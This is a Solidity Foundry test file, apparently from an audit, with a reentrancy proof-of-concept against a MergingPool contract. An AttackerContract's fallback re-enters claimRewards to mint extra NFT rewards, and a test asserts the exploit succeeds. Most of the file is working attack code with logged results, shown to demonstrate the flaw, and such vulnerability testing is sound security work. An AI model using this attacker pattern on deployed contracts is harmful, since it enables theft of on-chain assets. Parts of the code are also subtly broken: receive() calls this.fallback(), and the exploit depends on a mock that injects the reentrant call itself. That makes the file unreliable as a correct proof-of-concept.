// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {Test, console} from "forge-std/Test.sol";
import {MergingPool} from "../../src/MergingPool.sol";
import {FighterFarm} from "../../src/FighterFarm.sol";

// Mock FighterFarm contract for testing
contract MockFighterFarm {
    mapping(address => uint256) public balances;
    mapping(uint256 => address) public owners;
    uint256 public nextTokenId = 1;
    
    function mintFromMergingPool(
        address to,
        string calldata modelURI,
        string calldata modelType,
        uint256[2] calldata customAttributes
    ) external {
        uint256 tokenId = nextTokenId++;
        owners[tokenId] = to;
        balances[to]++;
        // This external call can trigger reentrancy
        (bool success,) = to.call{value: 0}("");
        if (!success) {
            // If call fails, continue silently
        }
    }
    
    function ownerOf(uint256 tokenId) external view returns (address) {
        return owners[tokenId];
    }
    
    function balanceOf(address owner) external view returns (uint256) {
        return balances[owner];
    }
}

// Malicious contract that exploits reentrancy
contract AttackerContract {
    MergingPool public mergingPool;
    uint256 public claimCount;
    uint256 public maxClaims;
    bool public inClaim;
    
    constructor(address _mergingPool) {
        mergingPool = MergingPool(_mergingPool);
    }
    
    // Fallback function that triggers reentrancy
    fallback() external payable {
        // Prevent infinite recursion
        if (!inClaim && claimCount < maxClaims) {
            inClaim = true;
            claimCount++;
            // Re-enter claimRewards with the same parameters
            mergingPool.claimRewards(
                ["uri1", "uri2", "uri3", "uri4", "uri5", "uri6"],
                ["type1", "type2", "type3", "type4", "type5", "type6"],
                [[1,1], [1,1], [1,1], [1,1], [1,1], [1,1]]
            );
            inClaim = false;
        }
    }
    
    receive() external payable {
        // Forward to fallback
        this.fallback();
    }
    
    function setMaxClaims(uint256 _maxClaims) external {
        maxClaims = _maxClaims;
    }
    
    function exploit() external {
        // Start the attack
        claimCount = 0;
        maxClaims = 2; // Allow 2 re-entries
        mergingPool.claimRewards(
            ["uri1", "uri2", "uri3", "uri4", "uri5", "uri6"],
            ["type1", "type2", "type3", "type4", "type5", "type6"],
            [[1,1], [1,1], [1,1], [1,1], [1,1], [1,1]]
        );
    }
}

contract MergingPoolReentrancyTest is Test {
    MergingPool public mergingPool;
    MockFighterFarm public fighterFarm;
    AttackerContract public attackerContract;
    address public owner;
    address public admin;
    address public victim;
    
    function setUp() public {
        // Setup addresses
        owner = address(0x1);
        admin = address(0x2);
        victim = address(0x3);
        
        // Deploy contracts
        vm.startPrank(owner);
        fighterFarm = new MockFighterFarm();
        mergingPool = new MergingPool(owner, address(0xdead), address(fighterFarm));
        
        // Setup admin
        mergingPool.adjustAdminAccess(admin, true);
        vm.stopPrank();
        
        // Deploy attacker contract
        attackerContract = new AttackerContract(address(mergingPool));
    }
    
    function testReentrancyExploit() public {
        // Setup: Create winners for round 0
        vm.startPrank(admin);
        
        // Simulate that attacker contract won 2 times in round 0
        uint256[] memory winners = new uint256[](2);
        winners[0] = 1; // Attacker's fighter
        winners[1] = 2; // Attacker's second fighter
        
        // Mock the FighterFarm.ownerOf calls to return attacker contract
        vm.mockCall(
            address(fighterFarm),
            abi.encodeWithSelector(MockFighterFarm.ownerOf.selector, 1),
            abi.encode(address(attackerContract))
        );
        vm.mockCall(
            address(fighterFarm),
            abi.encodeWithSelector(MockFighterFarm.ownerOf.selector, 2),
            abi.encode(address(attackerContract))
        );
        
        // Pick winners for round 0
        mergingPool.pickWinner(winners);
        vm.stopPrank();
        
        // Check initial state
        assertEq(mergingPool.roundId(), 1);
        assertEq(mergingPool.getUnclaimedRewards(address(attackerContract)), 2);
        
        // Record initial balance
        uint256 initialBalance = fighterFarm.balanceOf(address(attackerContract));
        console.log("Initial NFT balance:", initialBalance);
        
        // Execute the exploit
        vm.startPrank(address(attackerContract));
        attackerContract.exploit();
        vm.stopPrank();
        
        // Check final balance
        uint256 finalBalance = fighterFarm.balanceOf(address(attackerContract));
        console.log("Final NFT balance:", finalBalance);
        console.log("NFTs minted:", finalBalance - initialBalance);
        console.log("Expected NFTs (without exploit):", 2);
        
        // The attacker should have received more than 2 NFTs due to reentrancy
        assertTrue(finalBalance - initialBalance > 2, "Reentrancy exploit failed - attacker didn't get extra NFTs");
        
        // Verify the vulnerability
        console.log("Exploit successful! Attacker received", finalBalance - initialBalance, "NFTs instead of 2");
    }
    
    function testNormalClaimWithoutReentrancy() public {
        // Setup: Create a normal winner (EOA)
        vm.startPrank(admin);
        
        uint256[] memory winners = new uint256[](2);
        winners[0] = 3;
        winners[1] = 4;
        
        // Mock ownerOf to return victim address
        vm.mockCall(
            address(fighterFarm),
            abi.encodeWithSelector(MockFighterFarm.ownerOf.selector, 3),
            abi.encode(victim)
        );
        vm.mockCall(
            address(fighterFarm),
            abi.encodeWithSelector(MockFighterFarm.ownerOf.selector, 4),
            abi.encode(victim)
        );
        
        mergingPool.pickWinner(winners);
        vm.stopPrank();
        
        // Check initial state
        assertEq(mergingPool.getUnclaimedRewards(victim), 2);
        
        // Record initial balance
        uint256 initialBalance = fighterFarm.balanceOf(victim);
        
        // Normal claim (no reentrancy)
        vm.startPrank(victim);
        mergingPool.claimRewards(
            ["uri1", "uri2"],
            ["type1", "type2"],
            [[1,1], [1,1]]
        );
        vm.stopPrank();
        
        // Check final balance
        uint256 finalBalance = fighterFarm.balanceOf(victim);
        
        // Should have received exactly 2 NFTs
        assertEq(finalBalance - initialBalance, 2, "Normal claim should mint exactly 2 NFTs");
        assertEq(mergingPool.getUnclaimedRewards(victim), 0, "No unclaimed rewards should remain");
    }
}